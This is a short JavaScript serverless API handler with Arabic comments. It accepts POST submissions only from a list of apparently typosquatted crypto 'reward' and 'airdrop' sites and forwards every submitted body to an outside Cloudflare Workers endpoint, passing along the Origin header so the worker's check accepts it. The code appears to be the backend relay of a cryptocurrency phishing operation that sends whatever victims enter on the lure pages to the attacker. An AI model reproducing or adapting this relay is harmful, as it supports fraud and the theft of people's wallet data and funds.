// api/submit.js

const ALLOWED_ORIGINS = [
  "https://reward-ethdefreum.netliffy.app",
  "https://frdees-vip.netlify.app",
  "https://reward-ethdereum.netlify.app",
  "https://free-vdip.netlify.app",
  "https://big-airdrop.netlify.app",
  "https://freefd-vip.netlify.app",
  "https://free-chances.netlify.app",
  "https://free-vfdip.netlify.app",
  "https://q-ethds.pagdes.dev"
];

const WORKER_URL = "https://1fuckurmotherhahahahahahaha.eth2-stiffness640.workers.dev/";

function corsHeaders(origin) {
  return {
    "Access-Control-Allow-Origin": origin,
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
    "Vary": "Origin"
  };
}

export default async function handler(req, res) {
  const origin = req.headers.origin || "";

  // OPTIONS (preflight)
  if (req.method === "OPTIONS") {
    if (!ALLOWED_ORIGINS.includes(origin)) {
      return res.status(403).json({ error: "Forbidden origin" });
    }
    return res
      .status(200)
      .set(corsHeaders(origin))
      .send("ok");
  }

  // نسمح فقط بـ POST ومن أصول مسموحة
  if (!ALLOWED_ORIGINS.includes(origin)) {
    return res.status(403).json({ error: "Forbidden origin" });
  }
  if (req.method !== "POST") {
    return res
      .status(405)
      .set(corsHeaders(origin))
      .json({ error: "Method Not Allowed" });
  }

  try {
    // نعيد توجيه نفس الـ body للـ Worker مع ترويسة Origin مطابقة
    const response = await fetch(WORKER_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        // مهم جدًا: الـWorker عندك يتحقق من Origin
        "Origin": origin
      },
      body: JSON.stringify(req.body)
    });

    const text = await response.text(); // قد تكون JSON أو نص
    // نحاول JSON أولاً
    let payload;
    try { payload = JSON.parse(text); } catch { payload = { raw: text }; }

    return res
      .status(response.status)
      .set(corsHeaders(origin))
      .json(payload);
  } catch (err) {
    return res
      .status(500)
      .set(corsHeaders(origin))
      .json({ error: "Failed forwarding request", details: err?.message || "unknown" });
  }
}
